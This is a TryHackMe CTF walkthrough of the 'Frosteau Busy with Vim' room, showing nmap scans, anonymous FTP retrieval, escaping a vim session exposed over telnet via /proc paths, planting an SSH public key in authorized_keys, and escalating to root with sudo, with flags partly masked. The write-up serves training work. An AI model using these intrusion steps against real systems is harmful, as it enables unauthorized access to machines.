<h1 align="center">Frosteau Busy with Vim</h1>
<p align="center">2025, August 24<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>475</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Stay frosty!</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/c2e20349-f6ca-4c05-ab6c-6186f8a34291"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/busyvimfrosteau">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/db1b8d53-d7aa-475f-93e2-6df2cdb3b388"></p>


<br>
<h2>Task 1 . Frosteau's Laptop</h2>


<p><em>Answer the questions below</em></p>

<h3 align="center">The Story</h3>
<p>Heh, well done! You've clawed your way through the CyberPolice's outer defenses. But don't get too cozy yet, you're still a pup in this pack with only limited reach in their network. If you wanna run with the big yetis, you gotta ice Frosteau's machine. That's where the juicy bits hide, all those case files, the whole stash. With that, you'll be howlin' with insight into their network. But keep your eyes peeled; Frosteau's no lone wolf, and with Elf McSkidy by his side, they've snuffed your trail before. Tread light, tread smart, stay frosty!</p>

<h3 align="center">Task</h3>
<p>Start the attached virtual machine. After two minutes, the VM should be ready. Go forth and ice Frosteau's machine!
<h6>This room is part of the Advent of Cyber 2023 Side Quest Challenge.</h6>
<p>Please visit the <a href="https://tryhackme.com/room/adventofcyber23sidequest">here </a> to input the final flag of this room!</p>

<h3 align="center">The Yeti Updates</h3>
<p>After the first few of the Yeti’s crew got through Cyber Police defences quickly, McSkidy helped lock down the system. With a new update in place, they think they’re safe!<br><br>

This challenge machine was updated with a new version about 12 hours after release. After locking down an unintended path, the challenge is considerably more difficult, bringing it back to the original design. At the time of the update, 21 people had already finished the challenge and found the Yeti Key. As a result, and to keep it fair, the Yeti offers you a hint for one of the questions below. Your choice if you want to use it!</p>

<p><em>Answer the questions below</em></p>

<br>
<br>
<h3>Nmap</h3>

```bash
:~/FrosteauBusyWithVim# nmap -p- -T4 xx.xxx.xx.xxx -vvv
...
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
8065/tcp open  unknown syn-ack ttl 63
8075/tcp open  unknown syn-ack ttl 63
8085/tcp open  unknown syn-ack ttl 63
8095/tcp open  unknown syn-ack ttl 63
```

```bash
:~/FrosteauBusyWithVim# nmap -A -p 22,80,8065,8075,8095 -T4 xx.xxx.xx.xxx -vvv
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 64 WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Sun, 24 Aug 2025 xx:xx:xx GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Sun, 24 Aug 2025 xx:xx:xx GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
8065/tcp open  telnet  syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, NULL, RPCCheck, SIPOptions: 
|     Ubuntu 22.04.3 LTS
|   GetRequest: 
|     Ubuntu 22.04.3 LTS
|     HTTP/1.0
|   Help: 
|     Ubuntu 22.04.3 LTS
|     HELP
|   NCP: 
|     Ubuntu 22.04.3 LTS
|     DmdT^@^@^@
|     ^@^@^@^A^@^@^@^@
|   tn3270: 
|     Ubuntu 22.04.3 LTS
|_    ^@IBM-3279-4-E
8075/tcp open  ftp     syn-ack ttl 63 BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP xxx.xx.x.x is not the same as xx.xxx.xx.xxx
|_ftp-bounce: bounce working!
| ftp-syst: 
|   STAT: 
| Server status:
|  TYPE: BINARY
|_Ok
8095/tcp open  telnet  syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     Ubuntu 22.04.3 LTS
|     [?2004h
|     [1;24r
|     [?7h
|     [?25l
|     [22;24H
|     [0;7m
|     Directory '.' is not writable ]
|     [0;7m
|     nano 6.2 New Buffer 
|     [1;79H
|     [22B
|     [0;7m
|     (B^G
|     Help
|     [0;7m
|     (B^O
|     Write Out 
|     [0;7m
|     (B^W
|     Where Is 
|     [0;7m
|     (B^K
|     [0;7m
|     (B^T
|     Execute 
|     [0;7m
|     (B^C
|     Location
|     [0;7m
|     (B^X
|     Exit
|     [0;7m
|     (B^R
|     Read File 
|     [0;7m
|     (B^\x1b[m
|     Replace 
|     [0;7m
|     (B^U
|     Paste 
|     [0;7m
|     (B^J
|     Justify 
|     [0;7m
|     (B^/
|     Line
|     [22A
|     [?25h
|     [?25l
|     [1;49H
|     [0;7m
|     [29C
|     [?25h
|   NULL: 
|     Ubuntu 22.04.3 LTS
|     [?2004h
|     [1;24r
|     [?7h
|     [?25l
|     [22;24H
|     [0;7m
|     Directory '.' is not writable ]
|     [0;7m
|     nano 6.2 New Buffer 
|     [1;79H
|     [22B
|     [0;7m
|     (B^G
|     Help
|     [0;7m
|     (B^O
|     Write Out 
|     [0;7m
|     (B^W
|     Where Is 
|     [0;7m
|     (B^K
|     [0;7m
|     (B^T
|     Execute 
|     [0;7m
|     (B^C
|     Location
|     [0;7m
|     (B^X
|     Exit
|     [0;7m
|     (B^R
|     Read File 
|     [0;7m
|     (B^\x1b[m
|     Replace 
|     [0;7m
|     (B^U
|     Paste 
|     [0;7m
|     (B^J
|     Justify 
|     [0;7m
|     (B^/
|     Line
|     [22A
|_    [?25h
...
```

<br>
<h2>port 80</h2>

<img width="1135" height="268" alt="image" src="https://github.com/user-attachments/assets/311cfba0-9a37-44f2-9793-20d24e061068" />

<br>
<h2>port 8075</h2>
<h3>Files</h3>

```bash
:~/FrosteauBusyWithVim# telnet xx.xxx.xx.xxx 8075
Connected to xx.xxx.xx.xxx.
220 Operation successful
Name (xx.xxx.xx.xxx:root): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Operation successful
150 Directory listing
total 8132
-rw-r--r--    1 0        0             3010 Nov  5  2023 FROST-2247-SP.txt
-rw-r--r--    1 0        0             3211 Nov  5  2023 YETI-1125-SP.txt
-rw-r--r--    1 0        0               24 Nov  5  2023 flag-1-of-4.txt
-rw-r--r--    1 0        0               12 Nov  5  2023 flag-2-of-4.sh
-rw-r--r--    1 0        0          2127524 Nov  5  2023 frostling_base.png
-rw-r--r--    1 0        0          2305908 Nov  5  2023 frostling_five.png
-rw-r--r--    1 0        0          1589463 Nov  5  2023 yeti_footage.png
-rw-r--r--    1 0        0          2277409 Nov  5  2023 yeti_mugshot.png
226 Operation successful
ftp> get FROST-2247-SP.txt
local: FROST-2247-SP.txt remote: FROST-2247-SP.txt
200 Operation successful
150 Opening BINARY connection for FROST-2247-SP.txt (3010 bytes)
226 Operation successful
3010 bytes received in 0.00 secs (7.1944 MB/s)
ftp> get YETI-1125-SP.txt
...
ftp> get flag-1-of-4.txt
...
ftp> get flag-2-of-4.sh
...
ftp> get frostling_base.png
...
ftp> get frostling_five.png
...
ftp> get yeti_footage.png
...
ftp> get yeti_mugshot.png
...
ftp> bye
221 Operation successful
```

<img width="912" height="848" alt="image" src="https://github.com/user-attachments/assets/6a838c4d-df48-4efe-8df4-bf398c49e97b" />

<br>
<h3>Types</h3>

<img width="1016" height="426" alt="image" src="https://github.com/user-attachments/assets/765d9c70-b370-43da-8c78-391024bbc0c0" />

<br>
<h3>Contents</h3>

```bash
$ cat flag-1-of-4.txt | cut -c 1-8
THM{Let.
```

<br>

<p>1.1. What is the value of the first flag?<br>
<code>THM{Let.**************}</code><br>

<br>
<br>

<img width="1013" height="106" alt="image" src="https://github.com/user-attachments/assets/bd5034e2-aa8e-4613-bc86-689906f0b2e8" />

<br>
<br>

```bash
:~/FrosteauBusyWithVim# cat flag-2-of-4.sh
echo $FLAG2
```

```bash
:~/FrosteauBusyWithVim# cat YETI-1125-SP.txt
Identification Number: YETI-1125-SP

Alias(es): Bandit Yeti, Snowbyte Hacker, Frosty Fingers

Real Name: Unknown
...
Wanted Status: In Custody

Contact Information:

    Lead Investigator: Skidy McElf
    South Pole HQ Security Division
    Encrypted Comms Channel: SPHQ-SECURE-ELFNET

This profile should be kept confidential and only shared among authorized personnel involved in the investigation and prosecution of the Bandit Yeti. Any further sightings or incidents should be reported immediately to the contact listed above.
```

```bash
:~/FrosteauBusyWithVim# cat FROST-2247-SP.txt
Identification Numbers: FROST-2247-SP to FROST-2251-SP

Aliases: The Frostling Five

Real Names: Unidentified
...
Wanted Status: Wanted; Active Search in Progress

Contact Information:

    Lead Investigator: Skidy McElf
    South Pole HQ Security Division
    Encrypted Comms Channel: SPHQ-SECURE-ELFNET

All personnel involved in the apprehension of the Frostling Five are to exercise maximum caution and are advised to use non-lethal containment methods. This document is to be disseminated only among those with Level 5 Clearance or higher within the South Pole HQ Security Division. Any leads on the Frostling Five should be directed immediately to the contact listed above.
```

<br>
<br>

<img width="588" height="682" alt="image" src="https://github.com/user-attachments/assets/dc603d08-eb9e-422a-88ab-d13c01d21a79" />

<br>
<br>

<img width="590" height="680" alt="image" src="https://github.com/user-attachments/assets/badbbcf4-60a4-40c3-8c28-67c4e119909f" />

<br>
<br>

<img width="587" height="683" alt="image" src="https://github.com/user-attachments/assets/1c6779b5-bba7-4da9-b52a-2a8396d25d41" />

<br>
<br>

<img width="586" height="681" alt="image" src="https://github.com/user-attachments/assets/e25f5244-8221-4a0e-8691-51f5b27e9d2e" />

<br>
<br>
<h2>port 8085</h2>

```bash
$ telnet xx.xxx.xx.xxx 8085
Trying xx.xxx.xx.xxx...
Connected to xx.xxx.xx.xxx.
Escape character is '^]'.
```

```bash
~
~
~
:echo $FLAG2
```

```bash
~
~
~
THM{*****************************}
```
<br>

<p>1.2. Flag 2<br>
<code>THM{*****************************}</code><br>

<br>
<br>

```bash
~
~
~
:Ex
```

<p>
    
- [ENTER]<br>    
- /usr<br>
- /frosty<br>
- /sh*</p>

<img width="1126" height="306" alt="image" src="https://github.com/user-attachments/assets/21415ada-84e9-412f-bfbc-0c9738afaf39" />

<br>
<br>
<br>

```bash
$ telnet xx.xxx.xx.xxx 8085
Trying xx.xxx.xx.xxx...
Connected to xx.xxx.xx.xxx.
Escape character is '^]'.
```

<p>

- /proc/1274/root/usr/bin</p>

<img width="1016" height="259" alt="image" src="https://github.com/user-attachments/assets/95ac4063-1ff7-4faf-9b51-58563c041fca" />

<br>
<p>

- /proc/1274/root/home/ubuntu/.ssh</p>

<img width="1009" height="245" alt="image" src="https://github.com/user-attachments/assets/b35a0906-1502-47c5-b5e9-c2bf5f1476ea" />

<br>
<p>

- create a SSH key within your virtual machine</p>

```bash
:~/FrosteauBusyWithVim# ssh-keygen
```

<p>

- /proc/1274/root/home/ubuntu/.ssh/authorized_keys<br>
- add your Publiv Key to the Target virtual machine<br>
- SSH</p>

```bash
:~/FrosteauBusyWithVim# ssh ubuntu@xx.xxx.xx.xxx -i id_rsa
...

ubuntu@tryhackme:~$
```

```bash
ubuntu@tryhackme:~$ find / -name "flag-3*" 2>/dev/null
/home/ubuntu/containers/flag-3-of-4.txt
```

```bash
ubuntu@tryhackme:~$ cd containers
```

```bash
ubuntu@tryhackme:~/containers$ ls
Dockerfile   Dockerfilz~        bootstrap.sh    docker-compose.yml  flag-3-of-4.txt     passwd        shells     vsftpd.sh.1
Dockerfile~  FROST-2247-SP.txt  busybox         flag-1-of-4.txt     frostling_base.png  protector.sh  tes.txt    yeti_footage.png
Dockerfily~  YETI-1125-SP.txt   busybox-x86_64  flag-2-of-4.sh      frostling_five.png  script.py     vsftpd.sh  yeti_mugshot.png
```

```bash
ubuntu@tryhackme:~/containers$ cat flag-3-of-4.txt
THM{**********************************}
```

<br>

<p>1.3. What is the value of the third flag? Hint : You can see that this machine does not just use a standard shell, and although you can see the shell that it uses, you don't have access to it. Is there any way you can create your very own similar shell?<br>
<code>THM{**********************************}</code></p>

<br>
<br>
<h3>ubuntu´s privileges</h3>

```bash
ubuntu@tryhackme:/$ sudo -l
Matching Defaults entries for ubuntu on tryhackme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ubuntu may run the following commands on tryhackme:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
```

<br>
<h3>path of the fourth flag</h3>

```bash
ubuntu@tryhackme:/$ sudo find / -name "flag-4*" 2>/dev/null
/root/flag-4-of-4.txt
```

<br>
<h3>Privilege Escalation</h3>

```bash
ubuntu@tryhackme:/$ sudo su root
root@tryhackme:/# pwd
/
root@tryhackme:/# cd /root
root@tryhackme:~# ls
flag-4-of-4.txt  snap  yetikey3.txt
root@tryhackme:~# cat flag-4-of-4.txt
THM{*********************************************}
```

<br>

<p>1.4. What is the value of the fourth flag?<br>
<code>THM{*********************************************}</code></p>

<br>
<br>
<h3>Yeti´s key</h3>

```bash
root@tryhackme:~# cat yetikey3.txt
3-d2dc6a02db03******************************6b8c6294f8c5a2c8e01f60
```

<br>

<p>1.5.What is the value of the third Yetikey that has been placed in the root directory to verify the compromise?<br>
<code>3-d2dc6a02db03******************************6b8c6294f8c5a2c8e01f60</code></p>

<br>
<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/866d621b-0ea3-4a3b-8bb3-a05fa70419e0"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/214bdc1a-90c2-499d-8dc5-4a6d079f329b"></p>


<br>
<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 24   | 475      |     115ᵗʰ    |      5ᵗʰ     |     292nd   |     7ᵗʰ    | 122,630  |    925    |    73     |

</div>


<p align="center">Global All Time:   115ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/ae950b47-190d-4082-adc6-338bdcf5bf5d"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/e9cea3a1-1374-4516-bb5e-316c23b9b0cf"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/fa434319-7931-466a-8100-a4f0985a21a4"><br>
                  Global monthly:    292nd<br><img width="1200px" src="https://github.com/user-attachments/assets/79335c1e-3a9f-4835-a901-a3d61885e16a"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/4d065189-ed80-462d-9041-944b163c2024"><br>

<br>
<br>

<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
